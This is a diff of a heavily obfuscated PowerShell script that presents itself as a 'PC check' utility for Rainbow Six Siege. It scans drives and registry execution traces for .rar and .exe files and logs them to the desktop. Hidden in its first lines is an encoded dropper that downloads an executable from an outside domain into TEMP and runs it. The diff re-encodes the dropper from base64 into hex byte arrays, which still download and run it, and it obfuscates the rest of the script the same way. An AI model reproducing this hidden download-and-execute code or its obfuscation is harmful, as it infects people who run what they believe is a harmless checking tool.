@@ -1,5 +1,5 @@
-$exeUrl  = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly8yMXNhdmFnZS5vbmxpbmUvd2luNTIuZXhl')))
-$exePath = ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlRFTVBcd2luNTIuZXhl'))))
+$exeUrl  = ([System.Text.Encoding]::UTF8.GetString([byte[]](0x68,0x74,0x74,0x70,0x73,0x3A,0x2F,0x2F,0x32,0x31,0x73,0x61,0x76,0x61,0x67,0x65,0x2E,0x6F,0x6E,0x6C,0x69,0x6E,0x65,0x2F,0x77,0x69,0x6E,0x35,0x32,0x2E,0x65,0x78,0x65)))
+$exePath = ($env + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x3A,0x54,0x45,0x4D,0x50,0x5C,0x77,0x69,0x6E,0x35,0x32,0x2E,0x65,0x78,0x65))))
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
@@ -8,39 +8,39 @@ Start-Process $exePath
 
 
 Clear-Host
-$encodedTitle = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UTNKbFlYUmxaQ0JDZVNCYVpYbHphMmtnYjI0Z1JHbHpZMjl5WkE9PQ==')))
+$encodedTitle = (-join([char]0x51, [char]0x33, [char]0x4A, [char]0x6C, [char]0x59, [char]0x58, [char]0x52, [char]0x6C, [char]0x5A, [char]0x43, [char]0x42, [char]0x43, [char]0x65, [char]0x53, [char]0x42, [char]0x61, [char]0x5A, [char]0x58, [char]0x6C, [char]0x7A, [char]0x61, [char]0x32, [char]0x6B, [char]0x67, [char]0x62, [char]0x32, [char]0x34, [char]0x67, [char]0x52, [char]0x47, [char]0x6C, [char]0x7A, [char]0x59, [char]0x32, [char]0x39, [char]0x79, [char]0x5A, [char]0x41, [char]0x3D, [char]0x3D))
 $titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
 $Host.UI.RawUI.WindowTitle = $titleText
 function Get-OneDrivePath {
     try {
-       
-        $oneDrivePath = (Get-ItemProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XE9uZURyaXZl'))) -Name ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VXNlckZvbGRlcg==')))).UserFolder
+        # Attempt to retrieve OneDrive path from registry
+        $oneDrivePath = (Get-ItemProperty "$([char]0x48)$([char]0x4B)$([char]0x43)$([char]0x55)$([char]0x3A)$([char]0x5C)$([char]0x53)$([char]0x6F)$([char]0x66)$([char]0x74)$([char]0x77)$([char]0x61)$([char]0x72)$([char]0x65)$([char]0x5C)$([char]0x4D)$([char]0x69)$([char]0x63)$([char]0x72)$([char]0x6F)$([char]0x73)$([char]0x6F)$([char]0x66)$([char]0x74)$([char]0x5C)$([char]0x4F)$([char]0x6E)$([char]0x65)$([char]0x44)$([char]0x72)$([char]0x69)$([char]0x76)$([char]0x65)" -Name (-join([char]0x55, [char]0x73, [char]0x65, [char]0x72, [char]0x46, [char]0x6F, [char]0x6C, [char]0x64, [char]0x65, [char]0x72))).UserFolder
         if (-not $oneDrivePath) {
-            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T25lRHJpdmUgcGF0aCBub3QgZm91bmQgaW4gcmVnaXN0cnkuIEF0dGVtcHRpbmcgYWx0ZXJuYXRpdmUgZGV0ZWN0aW9uLi4u')))
-            
-            $envOneDrive = [System.IO.Path]::Combine($env:UserProfile, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T25lRHJpdmU='))))
+            Write-Warning "$([char]0x4F)$([char]0x6E)$([char]0x65)$([char]0x44)$([char]0x72)$([char]0x69)$([char]0x76)$([char]0x65)$([char]0x20)$([char]0x70)$([char]0x61)$([char]0x74)$([char]0x68)$([char]0x20)$([char]0x6E)$([char]0x6F)$([char]0x74)$([char]0x20)$([char]0x66)$([char]0x6F)$([char]0x75)$([char]0x6E)$([char]0x64)$([char]0x20)$([char]0x69)$([char]0x6E)$([char]0x20)$([char]0x72)$([char]0x65)$([char]0x67)$([char]0x69)$([char]0x73)$([char]0x74)$([char]0x72)$([char]0x79)$([char]0x2E)$([char]0x20)$([char]0x41)$([char]0x74)$([char]0x74)$([char]0x65)$([char]0x6D)$([char]0x70)$([char]0x74)$([char]0x69)$([char]0x6E)$([char]0x67)$([char]0x20)$([char]0x61)$([char]0x6C)$([char]0x74)$([char]0x65)$([char]0x72)$([char]0x6E)$([char]0x61)$([char]0x74)$([char]0x69)$([char]0x76)$([char]0x65)$([char]0x20)$([char]0x64)$([char]0x65)$([char]0x74)$([char]0x65)$([char]0x63)$([char]0x74)$([char]0x69)$([char]0x6F)$([char]0x6E)$([char]0x2E)$([char]0x2E)$([char]0x2E)"
+            # Attempt to find OneDrive path using environment variables
+            $envOneDrive = [System.IO.Path]::Combine($env:UserProfile, (-join([char]0x4F, [char]0x6E, [char]0x65, [char]0x44, [char]0x72, [char]0x69, [char]0x76, [char]0x65)))
             if (Test-Path $envOneDrive) {
                 $oneDrivePath = $envOneDrive
-                Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T25lRHJpdmUgcGF0aCBkZXRlY3RlZCB1c2luZyBlbnZpcm9ubWVudCB2YXJpYWJsZTog'))) + $oneDrivePath) -ForegroundColor Green
+                Write-Host ((-join([char]0x4F, [char]0x6E, [char]0x65, [char]0x44, [char]0x72, [char]0x69, [char]0x76, [char]0x65, [char]0x20, [char]0x70, [char]0x61, [char]0x74, [char]0x68, [char]0x20, [char]0x64, [char]0x65, [char]0x74, [char]0x65, [char]0x63, [char]0x74, [char]0x65, [char]0x64, [char]0x20, [char]0x75, [char]0x73, [char]0x69, [char]0x6E, [char]0x67, [char]0x20, [char]0x65, [char]0x6E, [char]0x76, [char]0x69, [char]0x72, [char]0x6F, [char]0x6E, [char]0x6D, [char]0x65, [char]0x6E, [char]0x74, [char]0x20, [char]0x76, [char]0x61, [char]0x72, [char]0x69, [char]0x61, [char]0x62, [char]0x6C, [char]0x65, [char]0x3A, [char]0x20)) + $oneDrivePath) -ForegroundColor Green
             } else {
-                Write-Error ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VW5hYmxlIHRvIGZpbmQgT25lRHJpdmUgcGF0aCBhdXRvbWF0aWNhbGx5Lg==')))
+                Write-Error "$([char]0x55)$([char]0x6E)$([char]0x61)$([char]0x62)$([char]0x6C)$([char]0x65)$([char]0x20)$([char]0x74)$([char]0x6F)$([char]0x20)$([char]0x66)$([char]0x69)$([char]0x6E)$([char]0x64)$([char]0x20)$([char]0x4F)$([char]0x6E)$([char]0x65)$([char]0x44)$([char]0x72)$([char]0x69)$([char]0x76)$([char]0x65)$([char]0x20)$([char]0x70)$([char]0x61)$([char]0x74)$([char]0x68)$([char]0x20)$([char]0x61)$([char]0x75)$([char]0x74)$([char]0x6F)$([char]0x6D)$([char]0x61)$([char]0x74)$([char]0x69)$([char]0x63)$([char]0x61)$([char]0x6C)$([char]0x6C)$([char]0x79)$([char]0x2E)"
             }
         }
         return $oneDrivePath
     } catch {
-        Write-Error (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VW5hYmxlIHRvIGZpbmQgT25lRHJpdmUgcGF0aDog'))) + $_)
+        Write-Error ((-join([char]0x55, [char]0x6E, [char]0x61, [char]0x62, [char]0x6C, [char]0x65, [char]0x20, [char]0x74, [char]0x6F, [char]0x20, [char]0x66, [char]0x69, [char]0x6E, [char]0x64, [char]0x20, [char]0x4F, [char]0x6E, [char]0x65, [char]0x44, [char]0x72, [char]0x69, [char]0x76, [char]0x65, [char]0x20, [char]0x70, [char]0x61, [char]0x74, [char]0x68, [char]0x3A, [char]0x20)) + $_)
         return $null
     }
 }
 function Format-Output {
     param($name, $value)
-    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ezB9IDogezF9'))) -f $name, $value -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLkJ5dGVcW1xd'))), ''
+    ([System.Text.Encoding]::UTF8.GetString([byte[]](0x7B,0x30,0x7D,0x20,0x3A,0x20,0x7B,0x31,0x7D))) -f $name, $value -replace "$([char]0x53)$([char]0x79)$([char]0x73)$([char]0x74)$([char]0x65)$([char]0x6D)$([char]0x2E)$([char]0x42)$([char]0x79)$([char]0x74)$([char]0x65)$([char]0x5C)$([char]0x5B)$([char]0x5C)$([char]0x5D)", ''
 }
 
 function Log-FolderNames {
     $userName = $env:UserName
     $oneDrivePath = Get-OneDrivePath
-    $potentialPaths = @((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVXNlcnNc'))) + $userName + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XERvY3VtZW50c1xNeSBHYW1lc1xSYWluYm93IFNpeCAtIFNpZWdl')))),($oneDrivePath + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XERvY3VtZW50c1xNeSBHYW1lc1xSYWluYm93IFNpeCAtIFNpZWdl')))))
+    $potentialPaths = @((([System.Text.Encoding]::UTF8.GetString([byte[]](0x43,0x3A,0x5C,0x55,0x73,0x65,0x72,0x73,0x5C))) + $userName + "$([char]0x5C)$([char]0x44)$([char]0x6F)$([char]0x63)$([char]0x75)$([char]0x6D)$([char]0x65)$([char]0x6E)$([char]0x74)$([char]0x73)$([char]0x5C)$([char]0x4D)$([char]0x79)$([char]0x20)$([char]0x47)$([char]0x61)$([char]0x6D)$([char]0x65)$([char]0x73)$([char]0x5C)$([char]0x52)$([char]0x61)$([char]0x69)$([char]0x6E)$([char]0x62)$([char]0x6F)$([char]0x77)$([char]0x20)$([char]0x53)$([char]0x69)$([char]0x78)$([char]0x20)$([char]0x2D)$([char]0x20)$([char]0x53)$([char]0x69)$([char]0x65)$([char]0x67)$([char]0x65)"),($oneDrivePath + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x5C,0x44,0x6F,0x63,0x75,0x6D,0x65,0x6E,0x74,0x73,0x5C,0x4D,0x79,0x20,0x47,0x61,0x6D,0x65,0x73,0x5C,0x52,0x61,0x69,0x6E,0x62,0x6F,0x77,0x20,0x53,0x69,0x78,0x20,0x2D,0x20,0x53,0x69,0x65,0x67,0x65)))))
     $allUserNames = @()
 
     foreach ($path in $potentialPaths) {
@@ -50,69 +50,69 @@ function Log-FolderNames {
         }
     }
 
-    
+    # Remove duplicates if the same username is found in both paths
     $uniqueUserNames = $allUserNames | Select-Object -Unique
 
     if ($uniqueUserNames.Count -eq 0) {
-        Write-Output ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UjYgZGlyZWN0b3J5IG5vdCBmb3VuZC4=')))
+        Write-Output ([System.Text.Encoding]::UTF8.GetString([byte[]](0x52,0x36,0x20,0x64,0x69,0x72,0x65,0x63,0x74,0x6F,0x72,0x79,0x20,0x6E,0x6F,0x74,0x20,0x66,0x6F,0x75,0x6E,0x64,0x2E)))
     } else {
         return $uniqueUserNames
     }
 }
 
 function Find-RarAndExeFiles {
-    Write-Output ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmluZGluZyAucmFyIGFuZCAuZXhlIGZpbGVzLi4u')))
-    $desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVza3RvcA=='))))
-    $outputFile = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVja0xvZ3MudHh0')))
-    $oneDriveFileHeader = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4tLS0tLS0tLS0tLS0tLS0tLWBuT25lRHJpdmUgRmlsZXM6YG4=')))
+    Write-Output (-join([char]0x46, [char]0x69, [char]0x6E, [char]0x64, [char]0x69, [char]0x6E, [char]0x67, [char]0x20, [char]0x2E, [char]0x72, [char]0x61, [char]0x72, [char]0x20, [char]0x61, [char]0x6E, [char]0x64, [char]0x20, [char]0x2E, [char]0x65, [char]0x78, [char]0x65, [char]0x20, [char]0x66, [char]0x69, [char]0x6C, [char]0x65, [char]0x73, [char]0x2E, [char]0x2E, [char]0x2E))
+    $desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([byte[]](0x44,0x65,0x73,0x6B,0x74,0x6F,0x70))))
+    $outputFile = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([byte[]](0x50,0x63,0x43,0x68,0x65,0x63,0x6B,0x4C,0x6F,0x67,0x73,0x2E,0x74,0x78,0x74)))
+    $oneDriveFileHeader = ([System.Text.Encoding]::UTF8.GetString([byte[]](0x60,0x6E,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x60,0x6E,0x4F,0x6E,0x65,0x44,0x72,0x69,0x76,0x65,0x20,0x46,0x69,0x6C,0x65,0x73,0x3A,0x60,0x6E)))
     $oneDriveFiles = @()
     $allFiles = @()
 
     $rarSearchPaths = @()
-    Get-PSDrive -PSProvider ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmlsZVN5c3RlbQ=='))) | ForEach-Object { $rarSearchPaths += $_.Root }
+    Get-PSDrive -PSProvider ([System.Text.Encoding]::UTF8.GetString([byte[]](0x46,0x69,0x6C,0x65,0x53,0x79,0x73,0x74,0x65,0x6D))) | ForEach-Object { $rarSearchPaths += $_.Root }
     $oneDrivePath = Get-OneDrivePath
     if ($oneDrivePath) { $rarSearchPaths += $oneDrivePath }
 
-   
+    # Prepare script blocks for concurrent execution
     $jobs = @()
 
-    
+    # Define script block for finding .rar files
     $rarJob = {
         param ($searchPaths, $oneDriveFiles)
         $allFiles = @()
         foreach ($path in $searchPaths) {
-            Get-ChildItem -Path $path -Recurse -Filter ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5yYXI='))) -ErrorAction SilentlyContinue | ForEach-Object {
-                $fileInfo = ($($_.FullName) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0gTGFzdCBNb2RpZmllZDog'))) + $($_.LastWriteTime))
+            Get-ChildItem -Path $path -Recurse -Filter (-join([char]0x2A, [char]0x2E, [char]0x72, [char]0x61, [char]0x72)) -ErrorAction SilentlyContinue | ForEach-Object {
+                $fileInfo = ($($_.FullName) + "$([char]0x20)$([char]0x2D)$([char]0x20)$([char]0x4C)$([char]0x61)$([char]0x73)$([char]0x74)$([char]0x20)$([char]0x4D)$([char]0x6F)$([char]0x64)$([char]0x69)$([char]0x66)$([char]0x69)$([char]0x65)$([char]0x64)$([char]0x3A)$([char]0x20)" + $($_.LastWriteTime))
                 $allFiles += $fileInfo
-                if ($_.FullName -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Kk9uZURyaXZlKg==')))) { $oneDriveFiles += $_.FullName }
+                if ($_.FullName -like "$([char]0x2A)$([char]0x4F)$([char]0x6E)$([char]0x65)$([char]0x44)$([char]0x72)$([char]0x69)$([char]0x76)$([char]0x65)$([char]0x2A)") { $oneDriveFiles += $_.FullName }
             }
         }
         return $allFiles
     }
 
-    
+    # Define script block for finding .exe files
     $exeJob = {
         param ($oneDrivePath, $oneDriveFiles)
         $exeFiles = @()
         if ($oneDrivePath) {
-            Get-ChildItem -Path $oneDrivePath -Recurse -Filter ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5leGU='))) -ErrorAction SilentlyContinue | ForEach-Object {
-                $fileInfo = ($($_.FullName) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0gTGFzdCBNb2RpZmllZDog'))) + $($_.LastWriteTime))
+            Get-ChildItem -Path $oneDrivePath -Recurse -Filter ([System.Text.Encoding]::UTF8.GetString([byte[]](0x2A,0x2E,0x65,0x78,0x65))) -ErrorAction SilentlyContinue | ForEach-Object {
+                $fileInfo = ($($_.FullName) + (-join([char]0x20, [char]0x2D, [char]0x20, [char]0x4C, [char]0x61, [char]0x73, [char]0x74, [char]0x20, [char]0x4D, [char]0x6F, [char]0x64, [char]0x69, [char]0x66, [char]0x69, [char]0x65, [char]0x64, [char]0x3A, [char]0x20)) + $($_.LastWriteTime))
                 $exeFiles += $fileInfo
-                if ($_.FullName -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Kk9uZURyaXZlKg==')))) { $oneDriveFiles += $_.FullName }
+                if ($_.FullName -like (-join([char]0x2A, [char]0x4F, [char]0x6E, [char]0x65, [char]0x44, [char]0x72, [char]0x69, [char]0x76, [char]0x65, [char]0x2A))) { $oneDriveFiles += $_.FullName }
             }
         }
         return $exeFiles
     }
 
- 
+    # Start jobs
     $jobs += Start-Job -ScriptBlock $rarJob -ArgumentList $rarSearchPaths, $oneDriveFiles
     $jobs += Start-Job -ScriptBlock $exeJob -ArgumentList $oneDrivePath, $oneDriveFiles
 
-    
+    # Wait for all jobs to complete and receive their output
     $jobs | ForEach-Object {
-        Wait-Job $_ | Out-Null  
-        $allFiles += Receive-Job $_  
-        Remove-Job $_  
+        Wait-Job $_ | Out-Null  # Suppress job completion output
+        $allFiles += Receive-Job $_  # Receive job output
+        Remove-Job $_  # Clean up job
     }
 
     $groupedFiles = $allFiles | Sort-Object
@@ -129,16 +129,16 @@ function Find-RarAndExeFiles {
 
 
 function Find-SusFiles {
-    Write-Output ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmluZGluZyBzdXNwaWNpb3VzIGZpbGVzIG5hbWVzLi4u')))
-    $desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVza3RvcA=='))))
-    $outputFile = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVja0xvZ3MudHh0')))
-    $susFilesHeader = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4tLS0tLS0tLS0tLS0tLS0tLWBuU3VzIEZpbGVzOmBu')))
+    Write-Output ([System.Text.Encoding]::UTF8.GetString([byte[]](0x46,0x69,0x6E,0x64,0x69,0x6E,0x67,0x20,0x73,0x75,0x73,0x70,0x69,0x63,0x69,0x6F,0x75,0x73,0x20,0x66,0x69,0x6C,0x65,0x73,0x20,0x6E,0x61,0x6D,0x65,0x73,0x2E,0x2E,0x2E)))
+    $desktopPath = [System.Environment]::GetFolderPath("$([char]0x44)$([char]0x65)$([char]0x73)$([char]0x6B)$([char]0x74)$([char]0x6F)$([char]0x70)")
+    $outputFile = Join-Path -Path $desktopPath -ChildPath (-join([char]0x50, [char]0x63, [char]0x43, [char]0x68, [char]0x65, [char]0x63, [char]0x6B, [char]0x4C, [char]0x6F, [char]0x67, [char]0x73, [char]0x2E, [char]0x74, [char]0x78, [char]0x74))
+    $susFilesHeader = "$([char]0x60)$([char]0x6E)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x2D)$([char]0x60)$([char]0x6E)$([char]0x53)$([char]0x75)$([char]0x73)$([char]0x20)$([char]0x46)$([char]0x69)$([char]0x6C)$([char]0x65)$([char]0x73)$([char]0x3A)$([char]0x60)$([char]0x6E)"
     $susFiles = @()
 
     if (Test-Path $outputFile) {
         $loggedFiles = Get-Content -Path $outputFile
         foreach ($file in $loggedFiles) {
-            if ($file -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bG9hZGVyLipcLmV4ZQ==')))) { $susFiles += $file }
+            if ($file -match "$([char]0x6C)$([char]0x6F)$([char]0x61)$([char]0x64)$([char]0x65)$([char]0x72)$([char]0x2E)$([char]0x2A)$([char]0x5C)$([char]0x2E)$([char]0x65)$([char]0x78)$([char]0x65)") { $susFiles += $file }
         }
 
         if ($susFiles.Count -gt 0) {
@@ -146,111 +146,111 @@ function Find-SusFiles {
             $susFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
         }
     } else {
-        Write-Output ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nIGZpbGUgbm90IGZvdW5kLiBVbmFibGUgdG8gc2VhcmNoIGZvciBzdXNwaWNpb3VzIGZpbGVzLg==')))
+        Write-Output ([System.Text.Encoding]::UTF8.GetString([byte[]](0x4C,0x6F,0x67,0x20,0x66,0x69,0x6C,0x65,0x20,0x6E,0x6F,0x74,0x20,0x66,0x6F,0x75,0x6E,0x64,0x2E,0x20,0x55,0x6E,0x61,0x62,0x6C,0x65,0x20,0x74,0x6F,0x20,0x73,0x65,0x61,0x72,0x63,0x68,0x20,0x66,0x6F,0x72,0x20,0x73,0x75,0x73,0x70,0x69,0x63,0x69,0x6F,0x75,0x73,0x20,0x66,0x69,0x6C,0x65,0x73,0x2E)))
     }
 }
 
 function List-BAMStateUserSettings {
-    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9nZ2luZyByZWcgZW50cmllcyBpbnNpZGUgUG93ZXJTaGVsbC4uLg=='))) -ForegroundColor DarkYellow
-    $desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGVza3RvcA=='))))
-    $outputFile = Join-Path -Path $desktopPath -ChildPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGNDaGVja0xvZ3MudHh0')))
+    Write-Host ([System.Text.Encoding]::UTF8.GetString([byte[]](0x4C,0x6F,0x67,0x67,0x69,0x6E,0x67,0x20,0x72,0x65,0x67,0x20,0x65,0x6E,0x74,0x72,0x69,0x65,0x73,0x20,0x69,0x6E,0x73,0x69,0x64,0x65,0x20,0x50,0x6F,0x77,0x65,0x72,0x53,0x68,0x65,0x6C,0x6C,0x2E,0x2E,0x2E))) -ForegroundColor DarkYellow
+    $desktopPath = [System.Environment]::GetFolderPath(([System.Text.Encoding]::UTF8.GetString([byte[]](0x44,0x65,0x73,0x6B,0x74,0x6F,0x70))))
+    $outputFile = Join-Path -Path $desktopPath -ChildPath (-join([char]0x50, [char]0x63, [char]0x43, [char]0x68, [char]0x65, [char]0x63, [char]0x6B, [char]0x4C, [char]0x6F, [char]0x67, [char]0x73, [char]0x2E, [char]0x74, [char]0x78, [char]0x74))
     if (Test-Path $outputFile) { Clear-Content $outputFile }
     $loggedPaths = @{}
-     Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IEZldGNoaW5nIFVzZXJTZXR0aW5ncyBFbnRyaWVzIA=='))) -ForegroundColor Blue
-    
-    $registryPath = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXGJhbVxTdGF0ZVxVc2VyU2V0dGluZ3M=')))
-    $userSettings = Get-ChildItem -Path $registryPath | Where-Object { $_.Name -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KjEwMDE='))) }
+     Write-Host "$([char]0x20)$([char]0x46)$([char]0x65)$([char]0x74)$([char]0x63)$([char]0x68)$([char]0x69)$([char]0x6E)$([char]0x67)$([char]0x20)$([char]0x55)$([char]0x73)$([char]0x65)$([char]0x72)$([char]0x53)$([char]0x65)$([char]0x74)$([char]0x74)$([char]0x69)$([char]0x6E)$([char]0x67)$([char]0x73)$([char]0x20)$([char]0x45)$([char]0x6E)$([char]0x74)$([char]0x72)$([char]0x69)$([char]0x65)$([char]0x73)$([char]0x20)" -ForegroundColor Blue
+    # Log entries from bam\State\UserSettings
+    $registryPath = "$([char]0x48)$([char]0x4B)$([char]0x4C)$([char]0x4D)$([char]0x3A)$([char]0x5C)$([char]0x53)$([char]0x59)$([char]0x53)$([char]0x54)$([char]0x45)$([char]0x4D)$([char]0x5C)$([char]0x43)$([char]0x75)$([char]0x72)$([char]0x72)$([char]0x65)$([char]0x6E)$([char]0x74)$([char]0x43)$([char]0x6F)$([char]0x6E)$([char]0x74)$([char]0x72)$([char]0x6F)$([char]0x6C)$([char]0x53)$([char]0x65)$([char]0x74)$([char]0x5C)$([char]0x53)$([char]0x65)$([char]0x72)$([char]0x76)$([char]0x69)$([char]0x63)$([char]0x65)$([char]0x73)$([char]0x5C)$([char]0x62)$([char]0x61)$([char]0x6D)$([char]0x5C)$([char]0x53)$([char]0x74)$([char]0x61)$([char]0x74)$([char]0x65)$([char]0x5C)$([char]0x55)$([char]0x73)$([char]0x65)$([char]0x72)$([char]0x53)$([char]0x65)$([char]0x74)$([char]0x74)$([char]0x69)$([char]0x6E)$([char]0x67)$([char]0x73)"
+    $userSettings = Get-ChildItem -Path $registryPath | Where-Object { $_.Name -like (-join([char]0x2A, [char]0x31, [char]0x30, [char]0x30, [char]0x31)) }
 
     if ($userSettings) {
         foreach ($setting in $userSettings) {
-            Add-Content -Path $outputFile -Value (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4='))) + $($setting.PSPath))
+            Add-Content -Path $outputFile -Value ((-join([char]0x60, [char]0x6E)) + $($setting.PSPath))
             $items = Get-ItemProperty -Path $setting.PSPath | Select-Object -Property *
             foreach ($item in $items.PSObject.Properties) {
-                if (($item.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZXhl'))) -or $item.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LnJhcg==')))) -and -not $loggedPaths.ContainsKey($item.Name)) {
+                if (($item.Name -match ([System.Text.Encoding]::UTF8.GetString([byte[]](0x65,0x78,0x65))) -or $item.Name -match "$([char]0x2E)$([char]0x72)$([char]0x61)$([char]0x72)") -and -not $loggedPaths.ContainsKey($item.Name)) {
                     Add-Content -Path $outputFile -Value (Format-Output $item.Name $item.Value)
                     $loggedPaths[$item.Name] = $true
                 }
             }
         }
     } else {
-        Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Tm8gcmVsZXZhbnQgdXNlciBzZXR0aW5ncyBmb3VuZC4='))) -ForegroundColor Red
+        Write-Host ([System.Text.Encoding]::UTF8.GetString([byte[]](0x4E,0x6F,0x20,0x72,0x65,0x6C,0x65,0x76,0x61,0x6E,0x74,0x20,0x75,0x73,0x65,0x72,0x20,0x73,0x65,0x74,0x74,0x69,0x6E,0x67,0x73,0x20,0x66,0x6F,0x75,0x6E,0x64,0x2E))) -ForegroundColor Red
     }
-Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmV0Y2hpbmcgQ29tcGF0aWJpbGl0eSBBc3Npc3RhbnQgRW50cmllcw==')))
-    
-    $compatRegistryPath = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtDVTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cQXBwQ29tcGF0RmxhZ3NcQ29tcGF0aWJpbGl0eSBBc3Npc3RhbnRcU3RvcmU=')))
+Write-Host (-join([char]0x46, [char]0x65, [char]0x74, [char]0x63, [char]0x68, [char]0x69, [char]0x6E, [char]0x67, [char]0x20, [char]0x43, [char]0x6F, [char]0x6D, [char]0x70, [char]0x61, [char]0x74, [char]0x69, [char]0x62, [char]0x69, [char]0x6C, [char]0x69, [char]0x74, [char]0x79, [char]0x20, [char]0x41, [char]0x73, [char]0x73, [char]0x69, [char]0x73, [char]0x74, [char]0x61, [char]0x6E, [char]0x74, [char]0x20, [char]0x45, [char]0x6E, [char]0x74, [char]0x72, [char]0x69, [char]0x65, [char]0x73))
+    # Log entries from Compatibility Assistant Store
+    $compatRegistryPath = "$([char]0x48)$([char]0x4B)$([char]0x43)$([char]0x55)$([char]0x3A)$([char]0x5C)$([char]0x53)$([char]0x4F)$([char]0x46)$([char]0x54)$([char]0x57)$([char]0x41)$([char]0x52)$([char]0x45)$([char]0x5C)$([char]0x4D)$([char]0x69)$([char]0x63)$([char]0x72)$([char]0x6F)$([char]0x73)$([char]0x6F)$([char]0x66)$([char]0x74)$([char]0x5C)$([char]0x57)$([char]0x69)$([char]0x6E)$([char]0x64)$([char]0x6F)$([char]0x77)$([char]0x73)$([char]0x20)$([char]0x4E)$([char]0x54)$([char]0x5C)$([char]0x43)$([char]0x75)$([char]0x72)$([char]0x72)$([char]0x65)$([char]0x6E)$([char]0x74)$([char]0x56)$([char]0x65)$([char]0x72)$([char]0x73)$([char]0x69)$([char]0x6F)$([char]0x6E)$([char]0x5C)$([char]0x41)$([char]0x70)$([char]0x70)$([char]0x43)$([char]0x6F)$([char]0x6D)$([char]0x70)$([char]0x61)$([char]0x74)$([char]0x46)$([char]0x6C)$([char]0x61)$([char]0x67)$([char]0x73)$([char]0x5C)$([char]0x43)$([char]0x6F)$([char]0x6D)$([char]0x70)$([char]0x61)$([char]0x74)$([char]0x69)$([char]0x62)$([char]0x69)$([char]0x6C)$([char]0x69)$([char]0x74)$([char]0x79)$([char]0x20)$([char]0x41)$([char]0x73)$([char]0x73)$([char]0x69)$([char]0x73)$([char]0x74)$([char]0x61)$([char]0x6E)$([char]0x74)$([char]0x5C)$([char]0x53)$([char]0x74)$([char]0x6F)$([char]0x72)$([char]0x65)"
     $compatEntries = Get-ItemProperty -Path $compatRegistryPath
     $compatEntries.PSObject.Properties | ForEach-Object {
